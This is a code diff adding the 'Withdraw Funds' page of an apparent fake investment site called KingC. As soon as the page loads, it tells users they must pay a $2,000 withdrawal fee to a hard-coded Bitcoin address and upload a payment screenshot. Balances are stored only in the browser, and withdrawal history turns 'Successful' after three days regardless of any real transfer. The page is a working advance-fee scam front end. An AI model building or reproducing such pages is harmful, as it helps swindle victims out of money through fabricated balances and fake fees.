@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Withdraw Funds - KingC</title>
+  <style>
+  body {
+    margin: 0;
+    padding: 20px;
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c7744);
+    color: white;
+  }
+
+  .container {
+    max-width: 500px;
+    margin: auto;
+    background: rgba(255,255,255,0.05);
+    padding: 30px;
+    border-radius: 20px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+  }
+
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .balance, #status {
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 16px;
+  }
+
+  input, select, button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    border-radius: 10px;
+    border: none;
+    font-size: 16px;
+    outline: none;
+  }
+
+  select {
+    background: #1a2a2e;
+    color: white;
+  }
+
+  input[type="file"] {
+    background: #ffffff11;
+    color: white;
+  }
+
+  button {
+    background: white;
+    color: #2c7744;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s, transform 0.2s;
+  }
+
+  button:hover {
+    background: #e8e8e8;
+    transform: scale(1.01);
+  }
+
+  .back-btn {
+    margin-top: 10px;
+    background: transparent;
+    border: 1px solid white;
+    color: white;
+  }
+
+  .withdraw-log {
+    margin-top: 30px;
+    background: rgba(255,255,255,0.08);
+    padding: 15px;
+    border-radius: 15px;
+  }
+
+  .withdraw-log p {
+    margin: 5px 0;
+    font-size: 14px;
+  }
+
+  .success {
+    color: #90ee90;
+  }
+
+  .pending {
+    color: #ffcc66;
+  }
+
+  /* 🎯 Withdrawal Fee Modal */
+  #withdrawFeeNotice {
+    display: none;
+    background: rgba(255, 255, 255, 0.07);
+    padding: 20px;
+    border-radius: 15px;
+    margin-top: 20px;
+    border: 1px solid rgba(255,255,255,0.2);
+  }
+
+  #withdrawFeeNotice p {
+    font-size: 15px;
+    line-height: 1.6;
+  }
+
+  #walletAddress {
+    background: #fff;
+    color: #000;
+    padding: 10px;
+    border-radius: 8px;
+    word-break: break-all;
+    font-weight: bold;
+    text-align: center;
+  }
+
+  #uploadSection {
+    margin-top: 15px;
+    border-top: 1px dashed #aaa;
+    padding-top: 15px;
+  }
+
+  hr {
+    border-color: #ffffff22;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h2>Withdraw Funds</h2><label for="currency">Select Currency</label>
+<select id="currency" onchange="updateForm()">
+  <!-- <option value="NGN">Naira (₦)</option>-->
+  <option value="USD">US Dollar ($)</option>
+  <option value="ARS">Argentine Peso ($)</option>
+  <option value="BTC">Bitcoin (₿)</option>
+</select>
+
+<div class="balance">Current Balance: <span id="symbol">₦</span><span id="currentBalance">0</span></div>
+<div id="status"></div>
+
+<input type="number" id="amount" placeholder="Amount to Withdraw" />
+<input type="text" id="accountName" placeholder="Account Name" />
+<input type="text" id="bankName" placeholder="Bank/Wallet Name" />
+<input type="text" id="accountNumber" placeholder="Account Number or Wallet Address" />
+<!-- Withdrawal Fee Notice Modal -->
+<div id="withdrawFeeNotice" style="display:none; background:#111; padding:20px; border-radius:15px; margin-bottom:20px;">
+  <p>⚠️ <strong>To withdraw your funds, you need to pay a withdrawal fee of $2,000.</strong></p>
+  <p>Click the button below to copy the Bitcoin wallet address for the fee payment:</p>
+  <div style="background:#fff; color:#000; padding:10px; border-radius:8px; word-break:break-all;" id="walletAddress">bc1ql8tak82m6g9rpxhytr68vk7stlgdt6nm9v4h0y</div>
+  <button onclick="copyWalletAddress()" style="margin-top:10px;">📋 Copy Wallet Address</button>
+  <hr style="margin:20px 0; border-color:#fff3;">
+  <button onclick="showUploadSection()">📸 I've Sent the Payment – Upload Screenshot</button>
+
+  <div id="uploadSection" style="display:none; margin-top:20px;">
+    <input type="file" id="receiptFile" accept="image/*" />
+    <button onclick="uploadReceiptAndWithdraw()">✅ Upload File & Withdraw</button>
+  </div>
+</div>
+<button onclick="withdrawFunds()">Withdraw</button>
+<button class="back-btn" onclick="goBack()">← Back to Dashboard</button>
+
+<div class="withdraw-log" id="withdrawHistory"></div>
+
+  </div>  <script>
+    const user = JSON.parse(localStorage.getItem("kingc_user")) || {};
+    if (!user.balances) user.balances = { NGN: 0, USD: 0, ARS: 0, BTC: 0 };
+    if (!user.withdrawals) user.withdrawals = [];
+
+    const currencySymbols = { NGN: "₦", USD: "$", ARS: "$", BTC: "₿" };
+    const placeholders = {
+      NGN: {
+        accountName: "Account Name",
+        bankName: "Bank Name",
+        accountNumber: "Account Number"
+      },
+      USD: {
+        accountName: "Full Name",
+        bankName: "Bank Name",
+        accountNumber: "Account Number"
+      },
+      ARS: {
+        accountName: "Nombre Completo",
+        bankName: "Banco",
+        accountNumber: "CBU o CVU"
+      },
+      BTC: {
+        accountName: "Wallet Owner Name",
+        bankName: "Wallet Type (e.g., TrustWallet)",
+        accountNumber: "Bitcoin Wallet Address"
+      }
+    };
+
+    function updateForm() {
+      const currency = document.getElementById("currency").value;
+      document.getElementById("symbol").textContent = currencySymbols[currency];
+      document.getElementById("currentBalance").textContent = user.balances[currency] || 0;
+
+      document.getElementById("accountName").placeholder = placeholders[currency].accountName;
+      document.getElementById("bankName").placeholder = placeholders[currency].bankName;
+      document.getElementById("accountNumber").placeholder = placeholders[currency].accountNumber;
+    }
+
+    function withdrawFunds() {
+      const currency = document.getElementById("currency").value;
+      const amount = parseFloat(document.getElementById("amount").value);
+      const accountName = document.getElementById("accountName").value.trim();
+      const bankName = document.getElementById("bankName").value.trim();
+      const accountNumber = document.getElementById("accountNumber").value.trim();
+
+      if (!amount || !accountName || !bankName || !accountNumber) {
+        alert("Please fill out all fields.");
+        return;
+      }
+
+      if (amount > user.balances[currency]) {
+        alert("Insufficient balance in selected currency.");
+        return;
+      }
+
+      const withdrawal = {
+        amount,
+        currency,
+        timestamp: Date.now(),
+        bank: bankName,
+        account: accountNumber
+      };
+
+      user.balances[currency] -= amount;
+      user.withdrawals.push(withdrawal);
+      localStorage.setItem("kingc_user", JSON.stringify(user));
+
+      document.getElementById("status").textContent = `Withdrawal of ${currencySymbols[currency]}${amount} is pending. You will receive it in 3–7 days.`;
+
+      document.getElementById("amount").value = "";
+      document.getElementById("accountName").value = "";
+      document.getElementById("bankName").value = "";
+      document.getElementById("accountNumber").value = "";
+
+      updateForm();
+      renderWithdrawals();
+    }
+
+    function renderWithdrawals() {
+      const now = Date.now();
+      let html = "<h3 style='text-align:center;'>Withdrawal History</h3>";
+      user.withdrawals.forEach(w => {
+        const elapsed = now - w.timestamp;
+        const matured = elapsed >= 3 * 24 * 60 * 60 * 1000;
+        const status = matured ? "✅ Successful" : "⏳ Pending";
+        const statusClass = matured ? "success" : "pending";
+        const dateStr = new Date(w.timestamp).toLocaleString();
+        html += `<p class="${statusClass}">${currencySymbols[w.currency] || ''}${w.amount} to ${w.bank} (${w.account}) on ${dateStr} — ${status}</p>`;
+      });
+      document.getElementById("withdrawHistory").innerHTML = html;
+    }
+
+    function goBack() {
+      window.location.href = "dashboard.html";
+    }
+
+    updateForm();
+    renderWithdrawals();
+  
+  function copyWalletAddress() {
+  const wallet = document.getElementById("walletAddress").textContent;
+  navigator.clipboard.writeText(wallet).then(() => {
+    alert("✔️ Wallet address copied to clipboard!");
+  });
+}
+
+// Show upload section when user clicks "I've Sent the Payment"
+function showUploadSection() {
+  document.getElementById("uploadSection").style.display = "block";
+}
+
+// New: Trigger withdrawal AFTER upload
+function uploadReceiptAndWithdraw() {
+  const file = document.getElementById("receiptFile").files[0];
+  if (!file) {
+    alert("❌ Please select a screenshot of the fee payment.");
+    return;
+  }
+
+  // Here you would send the file to a server — for now we simulate
+  alert("📤 Receipt uploaded! Proceeding with withdrawal...");
+
+  // Now call the normal withdrawal function
+  withdrawFunds();
+}
+
+// 🔁 Show fee notice on page load
+window.addEventListener("DOMContentLoaded", () => {
+  document.getElementById("withdrawFeeNotice").style.display = "block";
+});
+  </script></body>
+</html>
